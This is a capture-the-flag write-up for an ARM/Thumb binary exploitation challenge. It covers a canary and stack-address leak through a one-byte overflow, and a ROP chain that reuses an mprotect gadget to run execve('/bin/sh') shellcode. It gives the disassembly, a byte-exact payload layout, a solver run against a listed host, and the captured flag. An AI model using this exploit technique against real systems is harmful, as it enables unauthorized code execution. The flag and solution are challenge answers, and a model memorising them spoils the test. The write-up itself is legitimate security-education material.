# PWN#Alpha — Vault Terminal (ARM)

**Objective (verbatim):** *"Get a shell on the remote host and read the flag."*
**Deliverable:** `vault` — ELF 32-bit **ARM (armhf/EABI5)**, **PIE, dynamically linked, stripped**.
Canary found, NX, Partial RELRO.
**Flag:** `CTF{3183b60e20b34af6528ff443e52b0445COBE}`

### 0. TL;DR

Third recompile of the same "Vault Terminal" source, this time ARM/Thumb-2, dynamically linked
and stripped — and, like PWN#Beta (MIPS), the **downloaded binary's `.data` has been deliberately
scrubbed** so it segfaults in its own obfuscated entry stub before ever reaching `main` (see §1).
Static analysis (capstone, Thumb mode) of the small (`0x484`-byte) app `.text` was still enough:
same 64-byte buffer, 65-byte name read (1-byte canary overflow, same leak trick as PWN#Delta),
150-byte message read (`0x96`) reaching well past the saved return address. Because this binary
is dynamically linked with **no `system()` import and no stack-popping gadget for `r0`-`r3`
anywhere in the tiny app code**, a classic ret2libc wasn't available without a libc-base leak —
but the author had planted a **self-mprotecting shellcode stub** (originally meant to decrypt and
exec a hidden 36-byte blob) whose *tail* — `mov r0,r3; r0 &= ~0xfff; r1=0x1000; r2=7 (RWX);
r7=125 (SYS_mprotect); svc #0; r3+=1; bx r3` — is reusable as-is: pop `r3` = our own leaked stack
buffer address, run the mprotect tail, land back in the (now executable) buffer, execute inline
Thumb shellcode. **No libc leak, no ASLR dependency** (qemu-user has none by default anyway).

### 1. The scrubbed entry stub (and why local testing needed a patched copy)

`e_entry = 0x9e1` (Thumb). Its code: `mov r0,pc; ldr r1,[pc,#N]; ldr r1,[r1]; ldr r2,[pc,#M];
eor r1,r1,r2; add r0,r0,r1; bx r0` — decode the XOR key from a relocated `.data` pointer (an
`R_ARM_RELATIVE` self-reference) XORed with a baked-in constant (`0x426f6772` — the **same**
magic constant seen in PWN#Beta's MIPS entry trampoline, confirming a shared, platform-wide
download-protection packer). In the shipped download, the `.data` word that should make this XOR
resolve to a meaningful jump target is **zeroed**, so it computes garbage and crashes immediately
— **before `main`, before string decryption, before anything**. A second, separate obfuscation
(`0x988`–`0x9de`) XOR-decrypts a 36-byte blob using a key derived from an actual **resolved GOT
pointer** (so it can't be solved statically at all) then `mprotect`s and jumps into it; this is
the stub this exploit's gadget was lifted from.
For **local validation only**, patch `e_entry` (file offset `0x18`) straight to `main`
(`0x945`) — this skips `__libc_start_main`'s normal path, which also breaks the (separately
XOR-encrypted, 4-byte repeating key) string decryption, so local prompts render as garbage. That's
cosmetic only; buffer offsets, gadget addresses and the overflow mechanics are unaffected and
were validated against this patched copy under `qemu-arm` + a manually fetched armhf `libc6` deb
(`QEMU_LD_PREFIX`) before firing at the real target, which runs un-scrubbed and prints correctly.

### 2. Binary recon (unobfuscated app code — the actual `.text` is tiny, `0x484` bytes)

- `vuln` @ `0x89a`: frame `sub sp,#0x48`; buffer at `r7+4`; canary saved/checked at `r7+0x44`
  (**buffer offset 0x40 = 64**, identical convention to every other arch in this series); saved
  `r7`/`LR` at **buffer offsets 68/72** (`push{r7,lr}` → `pop{r7,pc}` epilogue).
- `read(0,buf,0x41)` for the name (65 bytes — 1-byte canary overflow); `read(0,buf,0x96)` for the
  message (150 bytes — reaches **way** past `LR`, plenty of ROP room).
- Imports: `__libc_start_main, __cxa_finalize, printf, read, __stack_chk_fail, puts, setvbuf,
  abort` — **no `system`**, so no direct ret2libc without a leak.
- `main` @ `0x944` calls `setup()` (disables stdio buffering), a string-decrypt routine (XOR with
  a 4-byte repeating key at a fixed `.data` offset — unrelated to the entry-stub key), prints a
  banner, then loops `bl vuln; b` back — same infinite-loop shape as every binary in this series.
- Exhaustive gadget search of the whole `.text` (`capstone`, `skipdata=True`) found **no
  `pop {r0-r3, ...}`** of any kind — the usual "set up libc call args" primitive simply doesn't
  exist in this stripped, minimal app.

### 3. The reused mprotect-shellcode gadget

```
0x9c2: mov  r0, r3
0x9c4: movw r1, #0xf000
0x9c8: movt r1, #0xffff        ; r1 = 0xfffff000
0x9cc: ands r0, r1              ; r0 = page_align_down(r3)
0x9ce: movs r1, #1
0x9d0: lsls r1, r1, #0xc        ; r1 = 0x1000
0x9d2: movs r2, #7              ; PROT_READ|WRITE|EXEC
0x9d4: movw r7, #0x7d           ; SYS_mprotect = 125
0x9d8: svc  #0
0x9da: add.w r3, r3, #1         ; set Thumb bit
0x9de: bx   r3
```
Land here with `r3` = **any address inside our own buffer**, and the whole page becomes RWX, then
execution jumps straight into it (`r3+1`). The only missing piece is getting an attacker-chosen
value into `r3` on the way in — solved by a clean, pre-existing **`pop {r3, pc}`** at `0x676`
(tail of an unrelated dead function) reached directly via the hijacked `LR`.

### 4. Leak: canary **and** a stable stack address, no ASLR

Same `read(0,buf,0x41)`-into-64-byte-buffer, no-NUL, dangling-`%s` trick as PWN#Delta: send
**exactly 65 bytes, no trailing newline**. The echoed `"Hello, "` + our 65 bytes is followed by:
canary bytes 1–3, then the **old saved `r7`** (buffer offset 68) — which equals `R1_main`, the
stack pointer `vuln` was called with — then the first 2 bytes of the saved `LR` before a `0x00`
cuts the string. The saved-`r7` value is **identical across independent TCP connections**,
confirming qemu-user's default (no ASLR) behaviour on this deployment — exactly like the stable
"gap bytes" seen in PWN#Delta. From it: `BUFFER_ADDR = leaked_r7 - 0x4c` (vuln's own
`push{r7,lr}; sub sp,#0x48; add r7,sp,#0` then `buf = r7+4`), fully computed, **no hardcoded
address needed, works unchanged across runs**.

### 5. Byte-exact chain (message buffer, 84 bytes)

```
[0:28)   Thumb shellcode (keystone-assembled): mov r0,pc; add r0,#0x10; mov r1,#0; mov r2,#0;
         mov r7,#11 (execve); svc #0;  then b"/bin/sh\x00"  (20 bytes code + 8 bytes string)
[28:64)  filler
[64:68)  p32(leaked_canary)
[68:72)  filler (old r7 — unused)
[72:76)  p32(0x400676 | 1)        # pop {r3, pc}
[76:80)  p32(BUFFER_ADDR)         # -> r3  (points at offset 0 of this very buffer = shellcode)
[80:84)  p32(0x4009c2 | 1)        # -> pc  (mprotect-tail gadget)
```
`PIE_BASE = 0x400000` confirmed directly from a local `qemu-arm` run (unscrubbed-entry crash
trace showed the app's own code executing at `0x4009e0` etc.) and cross-checked against the
leaked partial `LR` low bytes. Flow: `vuln` → `pop{r3,pc}` sets `r3=BUFFER_ADDR` → mprotect-tail
makes that page RWX → `bx r3+1` jumps into our own shellcode → `execve("/bin/sh",0,0)`.

### 6. Dead ends / pitfalls hit

- **Assumed the loop would survive an LR redirect back to the "natural" return address
  (`main`+`0x976`+1) as a cheap isolation test** — it reliably crashed too, which looked like a
  PIE-base or offset error and burned a long debugging detour (re-deriving `R1_main`'s exact
  value through the epilogue's `adds r7,#0x48; mov sp,r7; pop{r7,pc}`, re-verifying every gadget
  address byte-for-byte, re-checking PIE base from the leak's low 16 bits). In the end the actual
  exploit chain (which never returns into compiler-generated code, only two hand-picked gadgets
  and raw shellcode) worked regardless — returning cleanly into `main` is a stricter, unrelated
  requirement (stack/arg state `main`'s surrounding code implicitly expects) that this exploit
  doesn't need to satisfy at all. **Lesson: don't build an isolation test that's harder to get
  right than the real exploit.**
- **Local string decryption breaks under the `e_entry`-patched local copy** (key depends on state
  `__libc_start_main` normally sets up) — cosmetic, but means local output can't be matched by
  literal prompt text; match on the raw bytes you sent instead (e.g. search for the echoed
  `b"A"*65`, not for `b"Hello, "`).
- **`objdump` has no ARM target either** — `capstone` (`CS_ARCH_ARM`, `CS_MODE_THUMB`,
  `skipdata=True`) throughout; PLT stub addresses were recovered by hand from `.rel.plt` + ARM
  (non-Thumb!) PLT stub disassembly, since the PLT itself is in ARM mode even though the app is
  Thumb.

### 7. Solver

`python3 exploit_alpha.py 169.58.126.107 5004` → leak → build the 84-byte payload → shell on the
inherited socket stdio. `id` → `uid=65534(nobody)`; flag at `/flag/flag.txt`.
Flag confirmed: `CTF{3183b60e20b34af6528ff443e52b0445COBE}`.

---

